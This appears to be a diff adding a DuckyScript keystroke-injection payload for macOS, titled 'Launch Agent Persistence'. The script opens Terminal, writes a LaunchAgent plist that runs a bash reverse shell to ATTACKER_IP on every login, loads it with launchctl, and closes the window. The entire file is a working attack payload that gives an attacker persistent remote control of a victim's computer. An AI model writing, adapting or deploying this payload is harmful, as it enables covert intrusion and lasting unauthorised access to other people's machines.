@@ -1,0 +1,30 @@
+REM Author: Generated
+REM Title: Launch Agent Persistence
+REM Target: macOS
+REM Version: 1.0
+REM Category: Persistence
+REM ---
+DELAY 1000
+REM Create launch agent for persistence
+REM Creates plist in ~/Library/LaunchAgents/
+REM ID 05ac:021e Apple:Keyboard
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 500
+ENTER
+DELAY 1000
+STRING mkdir -p ~/Library/LaunchAgents
+ENTER
+DELAY 500
+STRING echo '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>Label</key><string>com.agent.persist</string><key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1</string></array><key>RunAtLoad</key><true/></dict></plist>' > ~/Library/LaunchAgents/com.agent.persist.plist
+ENTER
+DELAY 500
+STRING launchctl load ~/Library/LaunchAgents/com.agent.persist.plist
+ENTER
+DELAY 500
+STRING echo 'Launch agent installed'
+ENTER
+DELAY 500
+GUI w
